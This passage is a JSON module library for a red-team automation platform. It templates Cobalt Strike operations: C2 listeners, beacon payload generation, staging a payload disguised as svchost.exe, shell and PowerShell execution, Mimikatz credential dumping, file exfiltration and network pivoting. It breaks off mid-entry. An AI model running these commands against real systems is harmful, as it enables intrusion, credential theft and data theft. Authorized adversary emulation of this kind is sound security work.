@@ -1,0 +1,2114 @@
+{
+  "packageVersion": "2026-01-08-v1",
+  "description": "Cobalt Strike command library with type-safe data object tracking",
+  "collections": [
+    {
+      "name": "LibraryModule",
+      "documents": [
+        
+        {
+          "_key": "lib_cs_create_listener",
+          "id": "cs-create-listener",
+          "name": "Create C2 Listener",
+          "icon": "",
+          "tactic": "TA0011",
+          "mitre": { "tacticId": "TA0011", "techniqueId": null },
+          "category": "Cobalt Strike",
+          "subcategory": "Infrastructure Setup",
+          "description": "Configure and start a C2 listener for beacon callbacks",
+          "riskLevel": "low",
+          "estimatedDuration": 30,
+          "executionType": "cobalt_strike",
+          "cobaltStrikeCommand": "listener_create ${name} ${protocol} ${port}",
+          "robotKeyword": null,
+          "robotTemplate": null,
+          "robotLibrary": null,
+          "shellCommand": null,
+          "inputs": [],
+          "outputs": [
+            {
+              "id": "listener",
+              "label": "C2 Listener",
+              "type": "C2_Listener",
+              "description": "Active listener configuration"
+            }
+          ],
+          "parameters": [
+            {
+              "id": "name",
+              "label": "Listener Name",
+              "type": "string",
+              "required": true,
+              "placeholder": "http-listener-01",
+              "default": null,
+              "description": "Unique listener identifier"
+            },
+            {
+              "id": "protocol",
+              "label": "Protocol",
+              "type": "select",
+              "required": true,
+              "placeholder": null,
+              "default": "http",
+              "options": ["http", "https", "dns", "smb"],
+              "description": "Listener protocol type"
+            },
+            {
+              "id": "port",
+              "label": "Port",
+              "type": "number",
+              "required": true,
+              "placeholder": "80",
+              "default": 80,
+              "description": "Listening port"
+            },
+            {
+              "id": "bind_address",
+              "label": "Bind Address",
+              "type": "string",
+              "required": true,
+              "placeholder": "0.0.0.0",
+              "default": "0.0.0.0",
+              "description": "Network interface to bind"
+            }
+          ],
+          "requirements": {
+            "c2Server": true,
+            "listeners": [],
+            "payloads": [],
+            "sshConnections": [],
+            "externalTools": [],
+            "libraries": []
+          },
+          "metadata": {
+            "version": "1.0.0",
+            "lastUpdated": "2026-01-08T00:00:00Z",
+            "updatedBy": "automation-team",
+            "validationStatus": "production",
+            "changeLog": "Initial creation from CS command library",
+            "owner": "OPFOR Team",
+            "status": "production",
+            "tags": ["c2", "infrastructure", "listener", "cobalt-strike"]
+          },
+          "outputObjects": [
+            {
+              "type": "C2_Listener",
+              "collection": "C2_Listener",
+              "create": true,
+              "keyStrategy": "deterministic",
+              "keyTemplate": "listener_${name}",
+              "schema": {
+                "listenerName": { "type": "string", "nullable": false },
+                "protocol": { "type": "string", "nullable": false },
+                "port": { "type": "number", "nullable": false },
+                "bindAddress": { "type": "string", "nullable": false },
+                "status": { "type": "string", "nullable": false, "default": "active" },
+                "createdAt": { "type": "datetime", "nullable": false },
+                "source": {
+                  "type": "object",
+                  "nullable": false,
+                  "properties": {
+                    "moduleKey": { "type": "string" },
+                    "runId": { "type": "string" },
+                    "stepId": { "type": "string" }
+                  }
+                }
+              }
+            }
+          ]
+        },
+        
+        {
+          "_key": "lib_cs_create_payload",
+          "id": "cs-create-payload",
+          "name": "Generate Payload",
+          "icon": "",
+          "tactic": "TA0001",
+          "mitre": { "tacticId": "TA0001", "techniqueId": null },
+          "category": "Cobalt Strike",
+          "subcategory": "Payload Generation",
+          "description": "Generate beacon payload (EXE, DLL, shellcode)",
+          "riskLevel": "high",
+          "estimatedDuration": 45,
+          "executionType": "cobalt_strike",
+          "cobaltStrikeCommand": "payload_generate ${listener} ${format} ${output_path}",
+          "robotKeyword": null,
+          "robotTemplate": null,
+          "robotLibrary": null,
+          "shellCommand": null,
+          "inputs": [
+            {
+              "id": "listener",
+              "label": "Target Listener",
+              "type": "C2_Listener",
+              "required": true,
+              "description": "Listener that payload will connect to"
+            }
+          ],
+          "outputs": [
+            {
+              "id": "payload",
+              "label": "Generated Payload",
+              "type": "Payload_Artifact",
+              "description": "Compiled payload file ready for deployment"
+            }
+          ],
+          "parameters": [
+            {
+              "id": "format",
+              "label": "Payload Format",
+              "type": "select",
+              "required": true,
+              "placeholder": null,
+              "default": "exe",
+              "options": ["exe", "dll", "shellcode", "powershell"],
+              "description": "Output file format"
+            },
+            {
+              "id": "architecture",
+              "label": "Architecture",
+              "type": "select",
+              "required": true,
+              "placeholder": null,
+              "default": "x64",
+              "options": ["x86", "x64"],
+              "description": "Target architecture"
+            },
+            {
+              "id": "output_path",
+              "label": "Output Path",
+              "type": "string",
+              "required": true,
+              "placeholder": "/tmp/payload.exe",
+              "default": null,
+              "description": "File path for generated payload"
+            }
+          ],
+          "requirements": {
+            "c2Server": true,
+            "listeners": [],
+            "payloads": [],
+            "sshConnections": [],
+            "externalTools": [],
+            "libraries": []
+          },
+          "metadata": {
+            "version": "1.0.0",
+            "lastUpdated": "2026-01-08T00:00:00Z",
+            "updatedBy": "automation-team",
+            "validationStatus": "production",
+            "changeLog": "Initial creation from CS command library",
+            "owner": "OPFOR Team",
+            "status": "production",
+            "tags": ["c2", "payload", "generation", "cobalt-strike"]
+          },
+          "outputObjects": [
+            {
+              "type": "Payload_Artifact",
+              "collection": "Payload_Artifact",
+              "create": true,
+              "keyStrategy": "deterministic",
+              "keyTemplate": "payload_${run_id}_${step_id}",
+              "schema": {
+                "filePath": { "type": "string", "nullable": false },
+                "fileType": { "type": "string", "nullable": false },
+                "hashMd5": { "type": "string", "nullable": true },
+                "hashSha256": { "type": "string", "nullable": true },
+                "architecture": { "type": "string", "nullable": false },
+                "listenerId": { "type": "string", "nullable": false },
+                "sizeBytes": { "type": "number", "nullable": true },
+                "createdAt": { "type": "datetime", "nullable": false },
+                "source": {
+                  "type": "object",
+                  "nullable": false,
+                  "properties": {
+                    "moduleKey": { "type": "string" },
+                    "runId": { "type": "string" },
+                    "stepId": { "type": "string" }
+                  }
+                }
+              }
+            }
+          ]
+        },
+        
+        {
+          "_key": "lib_cs_update_payload_location",
+          "id": "cs-move-payload",
+          "name": "Move Payload",
+          "icon": "",
+          "tactic": "TA0001",
+          "mitre": { "tacticId": "TA0001", "techniqueId": null },
+          "category": "Cobalt Strike",
+          "subcategory": "Artifact Management",
+          "description": "Relocate payload to organized or web-accessible directory",
+          "riskLevel": "low",
+          "estimatedDuration": 10,
+          "executionType": "shell_command",
+          "cobaltStrikeCommand": null,
+          "robotKeyword": null,
+          "robotTemplate": null,
+          "robotLibrary": null,
+          "shellCommand": "mv ${old_path} ${new_path}",
+          "inputs": [
+            {
+              "id": "payload",
+              "label": "Existing Payload",
+              "type": "Payload_Artifact",
+              "required": true,
+              "description": "Payload to relocate"
+            }
+          ],
+          "outputs": [
+            {
+              "id": "updated_payload",
+              "label": "Relocated Payload",
+              "type": "Payload_Artifact",
+              "description": "Payload at new location"
+            }
+          ],
+          "parameters": [
+            {
+              "id": "new_path",
+              "label": "New Location",
+              "type": "string",
+              "required": true,
+              "placeholder": "/var/www/html/updates/svchost.exe",
+              "default": null,
+              "description": "Destination path"
+            }
+          ],
+          "requirements": {
+            "c2Server": false,
+            "listeners": [],
+            "payloads": [],
+            "sshConnections": [],
+            "externalTools": [],
+            "libraries": []
+          },
+          "metadata": {
+            "version": "1.0.0",
+            "lastUpdated": "2026-01-08T00:00:00Z",
+            "updatedBy": "automation-team",
+            "validationStatus": "production",
+            "changeLog": "Initial creation from CS command library",
+            "owner": "OPFOR Team",
+            "status": "production",
+            "tags": ["payload", "file-management", "staging"]
+          },
+          "outputObjects": [
+            {
+              "type": "Payload_Artifact",
+              "collection": "Payload_Artifact",
+              "create": true,
+              "keyStrategy": "deterministic",
+              "keyTemplate": "payload_moved_${run_id}_${step_id}",
+              "schema": {
+                "filePath": { "type": "string", "nullable": false },
+                "oldPath": { "type": "string", "nullable": true },
+                "fileType": { "type": "string", "nullable": false },
+                "hashSha256": { "type": "string", "nullable": true },
+                "architecture": { "type": "string", "nullable": true },
+                "movedAt": { "type": "datetime", "nullable": false },
+                "source": {
+                  "type": "object",
+                  "nullable": false,
+                  "properties": {
+                    "moduleKey": { "type": "string" },
+                    "runId": { "type": "string" },
+                    "stepId": { "type": "string" }
+                  }
+                }
+              }
+            }
+          ]
+        },
+      
+        
+        {
+          "_key": "lib_cs_wait_for_beacon",
+          "id": "cs-wait-beacon",
+          "name": "Wait for Beacon Callback",
+          "icon": "",
+          "tactic": "TA0001",
+          "mitre": { "tacticId": "TA0001", "techniqueId": null },
+          "category": "Cobalt Strike",
+          "subcategory": "Initial Access",
+          "description": "Wait for victim to execute payload and beacon to check in",
+          "riskLevel": "high",
+          "estimatedDuration": 300,
+          "executionType": "cobalt_strike",
+          "cobaltStrikeCommand": "beacon_wait ${listener} ${timeout}",
+          "robotKeyword": null,
+          "robotTemplate": null,
+          "robotLibrary": null,
+          "shellCommand": null,
+          "inputs": [
+            {
+              "id": "listener",
+              "label": "Listening C2",
+              "type": "C2_Listener",
+              "required": true,
+              "description": "Active listener waiting for callback"
+            },
+            {
+              "id": "payload",
+              "label": "Deployed Payload",
+              "type": "Payload_Artifact",
+              "required": false,
+              "description": "Optional reference to payload used"
+            }
+          ],
+          "outputs": [
+            {
+              "id": "beacon_session",
+              "label": "Active Beacon",
+              "type": "Agent_Session",
+              "description": "Established beacon session on compromised host"
+            }
+          ],
+          "parameters": [
+            {
+              "id": "timeout",
+              "label": "Timeout (seconds)",
+              "type": "number",
+              "required": true,
+              "placeholder": "300",
+              "default": 300,
+              "description": "Maximum wait time for callback"
+            }
+          ],
+          "requirements": {
+            "c2Server": true,
+            "listeners": [],
+            "payloads": [],
+            "sshConnections": [],
+            "externalTools": [],
+            "libraries": []
+          },
+          "metadata": {
+            "version": "1.0.0",
+            "lastUpdated": "2026-01-08T00:00:00Z",
+            "updatedBy": "automation-team",
+            "validationStatus": "production",
+            "changeLog": "Initial creation from CS command library",
+            "owner": "OPFOR Team",
+            "status": "production",
+            "tags": ["c2", "initial-access", "beacon", "cobalt-strike"]
+          },
+          "outputObjects": [
+            {
+              "type": "Agent_Session",
+              "collection": "Agent_Session",
+              "create": true,
+              "keyStrategy": "deterministic",
+              "keyTemplate": "beacon_${run_id}_${step_id}",
+              "schema": {
+                "beaconId": { "type": "string", "nullable": false },
+                "internalIp": { "type": "string", "nullable": true },
+                "externalIp": { "type": "string", "nullable": true },
+                "hostname": { "type": "string", "nullable": true },
+                "userContext": { "type": "string", "nullable": true },
+                "processId": { "type": "number", "nullable": true },
+                "processName": { "type": "string", "nullable": true },
+                "architecture": { "type": "string", "nullable": true },
+                "os": { "type": "string", "nullable": true },
+                "privilegeLevel": { "type": "string", "nullable": true },
+                "domain": { "type": "string", "nullable": true },
+                "lastCheckin": { "type": "datetime", "nullable": true },
+                "sleepTime": { "type": "number", "nullable": true },
+                "jitter": { "type": "number", "nullable": true },
+                "createdAt": { "type": "datetime", "nullable": false },
+                "source": {
+                  "type": "object",
+                  "nullable": false,
+                  "properties": {
+                    "moduleKey": { "type": "string" },
+                    "runId": { "type": "string" },
+                    "stepId": { "type": "string" },
+                    "listenerId": { "type": "string", "nullable": true }
+                  }
+                }
+              }
+            }
+          ]
+        },
+      
+        
+        {
+          "_key": "lib_cs_shell",
+          "id": "cs-shell-command",
+          "name": "Execute Shell Command",
+          "icon": "",
+          "tactic": "TA0002",
+          "mitre": { "tacticId": "TA0002", "techniqueId": "T1059" },
+          "category": "Cobalt Strike",
+          "subcategory": "Command Execution",
+          "description": "Run arbitrary command through cmd.exe",
+          "riskLevel": "medium",
+          "estimatedDuration": 15,
+          "executionType": "cobalt_strike",
+          "cobaltStrikeCommand": "shell ${command}",
+          "robotKeyword": null,
+          "robotTemplate": null,
+          "robotLibrary": null,
+          "shellCommand": null,
+          "inputs": [
+            {
+              "id": "beacon",
+              "label": "Target Beacon",
+              "type": "Agent_Session",
+              "required": true,
+              "description": "Active beacon session"
+            }
+          ],
+          "outputs": [
+            {
+              "id": "result",
+              "label": "Command Output",
+              "type": "Command_Output",
+              "description": "STDOUT from executed command"
+            }
+          ],
+          "parameters": [
+            {
+              "id": "command",
+              "label": "Command",
+              "type": "text",
+              "required": true,
+              "placeholder": "whoami /all",
+              "default": null,
+              "description": "Shell command to execute"
+            }
+          ],
+          "requirements": {
+            "c2Server": true,
+            "listeners": [],
+            "payloads": [],
+            "sshConnections": [],
+            "externalTools": [],
+            "libraries": []
+          },
+          "metadata": {
+            "version": "1.0.0",
+            "lastUpdated": "2026-01-08T00:00:00Z",
+            "updatedBy": "automation-team",
+            "validationStatus": "production",
+            "changeLog": "Initial creation from CS command library",
+            "owner": "OPFOR Team",
+            "status": "production",
+            "tags": ["c2", "execution", "shell", "cobalt-strike"]
+          },
+          "outputObjects": [
+            {
+              "type": "Command_Output",
+              "collection": "Command_Output",
+              "create": true,
+              "keyStrategy": "deterministic",
+              "keyTemplate": "cmd_${run_id}_${step_id}",
+              "schema": {
+                "command": { "type": "string", "nullable": false },
+                "stdout": { "type": "string", "nullable": true },
+                "stderr": { "type": "string", "nullable": true },
+                "exitCode": { "type": "number", "nullable": true },
+                "timestamp": { "type": "datetime", "nullable": false },
+                "executionTimeMs": { "type": "number", "nullable": true },
+                "source": {
+                  "type": "object",
+                  "nullable": false,
+                  "properties": {
+                    "moduleKey": { "type": "string" },
+                    "runId": { "type": "string" },
+                    "stepId": { "type": "string" },
+                    "beaconId": { "type": "string", "nullable": true }
+                  }
+                }
+              }
+            }
+          ]
+        },
+        
+        {
+          "_key": "lib_cs_credential_dump",
+          "id": "cs-credential-dump",
+          "name": "Dump Credentials (Mimikatz)",
+          "icon": "",
+          "tactic": "TA0006",
+          "mitre": { "tacticId": "TA0006", "techniqueId": "T1003" },
+          "category": "Cobalt Strike",
+          "subcategory": "Credential Access",
+          "description": "Extract credentials from LSASS memory using Mimikatz",
+          "riskLevel": "critical",
+          "estimatedDuration": 45,
+          "executionType": "cobalt_strike",
+          "cobaltStrikeCommand": "mimikatz ${command}",
+          "robotKeyword": null,
+          "robotTemplate": null,
+          "robotLibrary": null,
+          "shellCommand": null,
+          "inputs": [
+            {
+              "id": "beacon",
+              "label": "Target Beacon",
+              "type": "Agent_Session",
+              "required": true,
+              "description": "Active beacon with elevated privileges required"
+            }
+          ],
+          "outputs": [
+            {
+              "id": "credentials",
+              "label": "Dumped Credentials",
+              "type": "Credential_Set",
+              "description": "Extracted usernames, passwords, and hashes"
+            }
+          ],
+          "parameters": [
+            {
+              "id": "command",
+              "label": "Mimikatz Command",
+              "type": "select",
+              "required": true,
+              "placeholder": null,
+              "default": "sekurlsa::logonpasswords",
+              "options": [
+                "sekurlsa::logonpasswords",
+                "sekurlsa::tickets",
+                "lsadump::sam",
+                "privilege::debug"
+              ],
+              "description": "Mimikatz module to execute"
+            }
+          ],
+          "requirements": {
+            "c2Server": true,
+            "listeners": [],
+            "payloads": [],
+            "sshConnections": [],
+            "externalTools": [],
+            "libraries": []
+          },
+          "metadata": {
+            "version": "1.0.0",
+            "lastUpdated": "2026-01-08T00:00:00Z",
+            "updatedBy": "automation-team",
+            "validationStatus": "production",
+            "changeLog": "Initial creation from CS command library",
+            "owner": "OPFOR Team",
+            "status": "production",
+            "tags": ["c2", "credentials", "mimikatz", "lsass", "cobalt-strike"]
+          },
+          "outputObjects": [
+            {
+              "type": "Credential_Set",
+              "collection": "Credential_Set",
+              "create": true,
+              "keyStrategy": "deterministic",
+              "keyTemplate": "cred_${run_id}_${step_id}",
+              "schema": {
+                "credentials": {
+                  "type": "array",
+                  "nullable": false,
+                  "items": {
+                    "type": "object",
+                    "properties": {
+                      "username": { "type": "string" },
+                      "domain": { "type": "string" },
+                      "passwordCleartext": { "type": "string" },
+                      "ntlmHash": { "type": "string" },
+                      "kerberosTicket": { "type": "string" },
+                      "credentialType": { "type": "string" }
+                    }
+                  }
+                },
+                "timestamp": { "type": "datetime", "nullable": false },
+                "sourceHost": { "type": "string", "nullable": true },
+                "mimikatzCommand": { "type": "string", "nullable": false },
+                "source": {
+                  "type": "object",
+                  "nullable": false,
+                  "properties": {
+                    "moduleKey": { "type": "string" },
+                    "runId": { "type": "string" },
+                    "stepId": { "type": "string" },
+                    "beaconId": { "type": "string", "nullable": true }
+                  }
+                }
+              }
+            }
+          ]
+        },
+        
+        {
+          "_key": "lib_cs_cd",
+          "id": "cs-change-directory",
+          "name": "Change Directory",
+          "icon": "",
+          "tactic": "TA0002",
+          "mitre": { "tacticId": "TA0002", "techniqueId": null },
+          "category": "Cobalt Strike",
+          "subcategory": "File System Navigation",
+          "description": "Navigate to different directory in beacon session",
+          "riskLevel": "low",
+          "estimatedDuration": 5,
+          "executionType": "cobalt_strike",
+          "cobaltStrikeCommand": "cd ${path}",
+          "robotKeyword": null,
+          "robotTemplate": null,
+          "robotLibrary": null,
+          "shellCommand": null,
+          "inputs": [
+            {
+              "id": "beacon",
+              "label": "Target Beacon",
+              "type": "Agent_Session",
+              "required": true,
+              "description": "Active beacon session"
+            }
+          ],
+          "outputs": [
+            {
+              "id": "beacon_updated",
+              "label": "Beacon (Updated State)",
+              "type": "Agent_Session",
+              "description": "Same beacon with updated working directory"
+            }
+          ],
+          "parameters": [
+            {
+              "id": "path",
+              "label": "Directory Path",
+              "type": "string",
+              "required": true,
+              "placeholder": "C:\\Windows\\System32",
+              "default": null,
+              "description": "Target directory path"
+            }
+          ],
+          "requirements": {
+            "c2Server": true,
+            "listeners": [],
+            "payloads": [],
+            "sshConnections": [],
+            "externalTools": [],
+            "libraries": []
+          },
+          "metadata": {
+            "version": "1.0.0",
+            "lastUpdated": "2026-01-08T00:00:00Z",
+            "updatedBy": "automation-team",
+            "validationStatus": "production",
+            "changeLog": "Initial creation from CS command library",
+            "owner": "OPFOR Team",
+            "status": "production",
+            "tags": ["c2", "filesystem", "navigation", "cobalt-strike"]
+          },
+          "outputObjects": [
+            {
+              "type": "Agent_Session",
+              "collection": "Agent_Session",
+              "create": false,
+              "keyStrategy": "update_existing",
+              "schema": {
+                "workingDirectory": { "type": "string", "nullable": false },
+                "lastDirectoryChange": { "type": "datetime", "nullable": false }
+              }
+            }
+          ]
+        },
+        
+        {
+          "_key": "lib_cs_upload",
+          "id": "cs-upload-file",
+          "name": "Upload File to Target",
+          "icon": "",
+          "tactic": "TA0002",
+          "mitre": { "tacticId": "TA0002", "techniqueId": "T1105" },
+          "category": "Cobalt Strike",
+          "subcategory": "File Transfer",
+          "description": "Upload file from attacker to victim machine",
+          "riskLevel": "medium",
+          "estimatedDuration": 30,
+          "executionType": "cobalt_strike",
+          "cobaltStrikeCommand": "upload ${local_path} ${remote_path}",
+          "robotKeyword": null,
+          "robotTemplate": null,
+          "robotLibrary": null,
+          "shellCommand": null,
+          "inputs": [
+            {
+              "id": "beacon",
+              "label": "Target Beacon",
+              "type": "Agent_Session",
+              "required": true,
+              "description": "Active beacon session"
+            },
+            {
+              "id": "file",
+              "label": "File to Upload",
+              "type": "Payload_Artifact",
+              "required": false,
+              "description": "Optional payload artifact reference"
+            }
+          ],
+          "outputs": [
+            {
+              "id": "uploaded_file",
+              "label": "Remote File",
+              "type": "File_Handle",
+              "description": "File now on target system"
+            }
+          ],
+          "parameters": [
+            {
+              "id": "local_path",
+              "label": "Local File Path",
+              "type": "file",
+              "required": true,
+              "placeholder": "/tmp/payload.exe",
+              "default": null,
+              "description": "Source file on attacker machine"
+            },
+            {
+              "id": "remote_path",
+              "label": "Remote Destination",
+              "type": "string",
+              "required": true,
+              "placeholder": "C:\\Windows\\Temp\\payload.exe",
+              "default": null,
+              "description": "Destination path on target"
+            }
+          ],
+          "requirements": {
+            "c2Server": true,
+            "listeners": [],
+            "payloads": [],
+            "sshConnections": [],
+            "externalTools": [],
+            "libraries": []
+          },
+          "metadata": {
+            "version": "1.0.0",
+            "lastUpdated": "2026-01-08T00:00:00Z",
+            "updatedBy": "automation-team",
+            "validationStatus": "production",
+            "changeLog": "Initial creation from CS command library",
+            "owner": "OPFOR Team",
+            "status": "production",
+            "tags": ["c2", "file-transfer", "upload", "staging", "cobalt-strike"]
+          },
+          "outputObjects": [
+            {
+              "type": "File_Handle",
+              "collection": "File_Handle",
+              "create": true,
+              "keyStrategy": "deterministic",
+              "keyTemplate": "file_${run_id}_${step_id}",
+              "schema": {
+                "remotePath": { "type": "string", "nullable": false },
+                "localPath": { "type": "string", "nullable": true },
+                "fileSize": { "type": "number", "nullable": true },
+                "hashMd5": { "type": "string", "nullable": true },
+                "hashSha256": { "type": "string", "nullable": true },
+                "uploadTime": { "type": "datetime", "nullable": false },
+                "source": {
+                  "type": "object",
+                  "nullable": false,
+                  "properties": {
+                    "moduleKey": { "type": "string" },
+                    "runId": { "type": "string" },
+                    "stepId": { "type": "string" },
+                    "beaconId": { "type": "string", "nullable": true }
+                  }
+                }
+              }
+            }
+          ]
+        },
+        
+        {
+          "_key": "lib_cs_download",
+          "id": "cs-download-file",
+          "name": "Download File from Target",
+          "icon": "",
+          "tactic": "TA0009",
+          "mitre": { "tacticId": "TA0009", "techniqueId": "T1005" },
+          "category": "Cobalt Strike",
+          "subcategory": "File Transfer",
+          "description": "Exfiltrate file from victim to attacker machine",
+          "riskLevel": "medium",
+          "estimatedDuration": 45,
+          "executionType": "cobalt_strike",
+          "cobaltStrikeCommand": "download ${remote_path}",
+          "robotKeyword": null,
+          "robotTemplate": null,
+          "robotLibrary": null,
+          "shellCommand": null,
+          "inputs": [
+            {
+              "id": "beacon",
+              "label": "Target Beacon",
+              "type": "Agent_Session",
+              "required": true,
+              "description": "Active beacon session"
+            }
+          ],
+          "outputs": [
+            {
+              "id": "downloaded_file",
+              "label": "Exfiltrated File",
+              "type": "File_Data",
+              "description": "File retrieved from target"
+            }
+          ],
+          "parameters": [
+            {
+              "id": "remote_path",
+              "label": "Remote File Path",
+              "type": "string",
+              "required": true,
+              "placeholder": "C:\\Users\\victim\\Documents\\secrets.xlsx",
+              "default": null,
+              "description": "File path on target system"
+            }
+          ],
+          "requirements": {
+            "c2Server": true,
+            "listeners": [],
+            "payloads": [],
+            "sshConnections": [],
+            "externalTools": [],
+            "libraries": []
+          },
+          "metadata": {
+            "version": "1.0.0",
+            "lastUpdated": "2026-01-08T00:00:00Z",
+            "updatedBy": "automation-team",
+            "validationStatus": "production",
+            "changeLog": "Initial creation from CS command library",
+            "owner": "OPFOR Team",
+            "status": "production",
+            "tags": ["c2", "file-transfer", "download", "exfiltration", "cobalt-strike"]
+          },
+          "outputObjects": [
+            {
+              "type": "File_Data",
+              "collection": "File_Data",
+              "create": true,
+              "keyStrategy": "deterministic",
+              "keyTemplate": "exfil_${run_id}_${step_id}",
+              "schema": {
+                "localPath": { "type": "string", "nullable": false },
+                "originalPath": { "type": "string", "nullable": false },
+                "fileSize": { "type": "number", "nullable": true },
+                "hashMd5": { "type": "string", "nullable": true },
+                "hashSha256": { "type": "string", "nullable": true },
+                "mimeType": { "type": "string", "nullable": true },
+                "downloadTime": { "type": "datetime", "nullable": false },
+                "source": {
+                  "type": "object",
+                  "nullable": false,
+                  "properties": {
+                    "moduleKey": { "type": "string" },
+                    "runId": { "type": "string" },
+                    "stepId": { "type": "string" },
+                    "beaconId": { "type": "string", "nullable": true }
+                  }
+                }
+              }
+            }
+          ]
+        },
+        
+        {
+          "_key": "lib_cs_rportfwd",
+          "id": "cs-reverse-port-forward",
+          "name": "Reverse Port Forward",
+          "icon": "",
+          "tactic": "TA0011",
+          "mitre": { "tacticId": "TA0011", "techniqueId": "T1090" },
+          "category": "Cobalt Strike",
+          "subcategory": "Network Pivoting",
+          "description": "Create reverse tunnel for network pivoting",
+          "riskLevel": "high",
+          "estimatedDuration": 20,
+          "executionType": "cobalt_strike",
+          "cobaltStrikeCommand": "rportfwd ${local_port} ${forward_host} ${forward_port}",
+          "robotKeyword": null,
+          "robotTemplate": null,
+          "robotLibrary": null,
+          "shellCommand": null,
+          "inputs": [
+            {
+              "id": "beacon",
+              "label": "Pivot Beacon",
+              "type": "Agent_Session",
+              "required": true,
+              "description": "Beacon to pivot through"
+            }
+          ],
+          "outputs": [
+            {
+              "id": "tunnel",
+              "label": "Network Tunnel",
+              "type": "Network_Pivot",
+              "description": "Active reverse port forward"
+            }
+          ],
+          "parameters": [
+            {
+              "id": "local_port",
+              "label": "Local Port",
+              "type": "number",
+              "required": true,
+              "placeholder": "8080",
+              "default": null,
+              "description": "Port on team server"
+            },
+            {
+              "id": "forward_host",
+              "label": "Forward Host",
+              "type": "string",
+              "required": true,
+              "placeholder": "192.168.1.50",
+              "default": null,
+              "description": "Target host IP"
+            },
+            {
+              "id": "forward_port",
+              "label": "Forward Port",
+              "type": "number",
+              "required": true,
+              "placeholder": "80",
+              "default": null,
+              "description": "Target port"
+            }
+          ],
+          "requirements": {
+            "c2Server": true,
+            "listeners": [],
+            "payloads": [],
+            "sshConnections": [],
+            "externalTools": [],
+            "libraries": []
+          },
+          "metadata": {
+            "version": "1.0.0",
+            "lastUpdated": "2026-01-08T00:00:00Z",
+            "updatedBy": "automation-team",
+            "validationStatus": "production",
+            "changeLog": "Initial creation from CS command library",
+            "owner": "OPFOR Team",
+            "status": "production",
+            "tags": ["c2", "pivoting", "tunnel", "port-forward", "cobalt-strike"]
+          },
+          "outputObjects": [
+            {
+              "type": "Network_Pivot",
+              "collection": "Network_Pivot",
+              "create": true,
+              "keyStrategy": "deterministic",
+              "keyTemplate": "rportfwd_${run_id}_${step_id}",
+              "schema": {
+                "tunnelType": { "type": "string", "nullable": false, "default": "rportfwd" },
+                "localPort": { "type": "number", "nullable": false },
+                "remoteHost": { "type": "string", "nullable": false },
+                "remotePort": { "type": "number", "nullable": false },
+                "status": { "type": "string", "nullable": false, "default": "active" },
+                "createdAt": { "type": "datetime", "nullable": false },
+                "source": {
+                  "type": "object",
+                  "nullable": false,
+                  "properties": {
+                    "moduleKey": { "type": "string" },
+                    "runId": { "type": "string" },
+                    "stepId": { "type": "string" },
+                    "beaconId": { "type": "string", "nullable": true }
+                  }
+                }
+              }
+            }
+          ]
+        },
+        
+        {
+          "_key": "lib_cs_socks",
+          "id": "cs-socks-proxy",
+          "name": "SOCKS Proxy",
+          "icon": "",
+          "tactic": "TA0011",
+          "mitre": { "tacticId": "TA0011", "techniqueId": "T1090" },
+          "category": "Cobalt Strike",
+          "subcategory": "Network Pivoting",
+          "description": "Create SOCKS proxy for network tunneling",
+          "riskLevel": "medium",
+          "estimatedDuration": 15,
+          "executionType": "cobalt_strike",
+          "cobaltStrikeCommand": "socks ${port}",
+          "robotKeyword": null,
+          "robotTemplate": null,
+          "robotLibrary": null,
+          "shellCommand": null,
+          "inputs": [
+            {
+              "id": "beacon",
+              "label": "Pivot Beacon",
+              "type": "Agent_Session",
+              "required": true,
+              "description": "Beacon to proxy through"
+            }
+          ],
+          "outputs": [
+            {
+              "id": "proxy",
+              "label": "SOCKS Proxy",
+              "type": "Network_Pivot",
+              "description": "Active SOCKS proxy configuration"
+            }
+          ],
+          "parameters": [
+            {
+              "id": "port",
+              "label": "SOCKS Port",
+              "type": "number",
+              "required": true,
+              "placeholder": "1080",
+              "default": 1080,
+              "description": "Port on team server"
+            },
+            {
+              "id": "version",
+              "label": "SOCKS Version",
+              "type": "select",
+              "required": true,
+              "placeholder": null,
+              "default": "socks4a",
+              "options": ["socks4a", "socks5"],
+              "description": "SOCKS protocol version"
+            }
+          ],
+          "requirements": {
+            "c2Server": true,
+            "listeners": [],
+            "payloads": [],
+            "sshConnections": [],
+            "externalTools": [],
+            "libraries": []
+          },
+          "metadata": {
+            "version": "1.0.0",
+            "lastUpdated": "2026-01-08T00:00:00Z",
+            "updatedBy": "automation-team",
+            "validationStatus": "production",
+            "changeLog": "Initial creation from CS command library",
+            "owner": "OPFOR Team",
+            "status": "production",
+            "tags": ["c2", "pivoting", "socks", "proxy", "cobalt-strike"]
+          },
+          "outputObjects": [
+            {
+              "type": "Network_Pivot",
+              "collection": "Network_Pivot",
+              "create": true,
+              "keyStrategy": "deterministic",
+              "keyTemplate": "socks_${run_id}_${step_id}",
+              "schema": {
+                "tunnelType": { "type": "string", "nullable": false, "default": "socks" },
+                "proxyType": { "type": "string", "nullable": false },
+                "port": { "type": "number", "nullable": false },
+                "bindAddress": { "type": "string", "nullable": true, "default": "127.0.0.1" },
+                "status": { "type": "string", "nullable": false, "default": "active" },
+                "createdAt": { "type": "datetime", "nullable": false },
+                "source": {
+                  "type": "object",
+                  "nullable": false,
+                  "properties": {
+                    "moduleKey": { "type": "string" },
+                    "runId": { "type": "string" },
+                    "stepId": { "type": "string" },
+                    "beaconId": { "type": "string", "nullable": true }
+                  }
+                }
+              }
+            }
+          ]
+        },
+        
+        {
+          "_key": "lib_cs_powershell",
+          "id": "cs-powershell-command",
+          "name": "Execute PowerShell Command",
+          "icon": "",
+          "tactic": "TA0002",
+          "mitre": { "tacticId": "TA0002", "techniqueId": "T1059.001" },
+          "category": "Cobalt Strike",
+          "subcategory": "PowerShell Execution",
+          "description": "Run PowerShell command or script block",
+          "riskLevel": "medium",
+          "estimatedDuration": 20,
+          "executionType": "cobalt_strike",
+          "cobaltStrikeCommand": "powershell ${command}",
+          "robotKeyword": null,
+          "robotTemplate": null,
+          "robotLibrary": null,
+          "shellCommand": null,
+          "inputs": [
+            {
+              "id": "beacon",
+              "label": "Target Beacon",
+              "type": "Agent_Session",
+              "required": true,
+              "description": "Active beacon session"
+            },
+            {
+              "id": "loaded_script",
+              "label": "Loaded Script (Optional)",
+              "type": "PowerShell_Script",
+              "required": false,
+              "description": "If invoking function from imported script"
+            }
+          ],
+          "outputs": [
+            {
+              "id": "result",
+              "label": "PowerShell Output",
+              "type": "Command_Output",
+              "description": "Result from PowerShell execution"
+            }
+          ],
+          "parameters": [
+            {
+              "id": "command",
+              "label": "PowerShell Command",
+              "type": "text",
+              "required": true,
+              "placeholder": "Get-Process | Where-Object {$_.CPU -gt 100}",
+              "default": null,
+              "description": "PowerShell code to execute"
+            }
+          ],
